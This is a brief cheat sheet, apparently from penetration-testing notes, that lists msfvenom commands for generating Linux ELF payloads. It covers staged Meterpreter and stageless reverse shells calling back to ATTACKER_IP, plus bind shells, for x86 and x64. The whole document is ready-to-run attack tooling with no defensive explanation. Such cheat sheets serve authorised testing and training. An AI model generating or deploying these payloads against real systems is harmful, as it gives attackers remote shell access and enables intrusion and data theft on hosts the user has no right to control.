# Msfvenom Payload Generation

# ============================================
# LINUX PAYLOADS
# ============================================

# Linux staged reverse shell (requires handler)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf

# Linux stageless reverse shell (standalone)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf

# Linux bind shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=PORT -f elf > bind.elf
msfvenom -p linux/x64/shell_bind_tcp LPORT=PORT -f elf > bind.elf
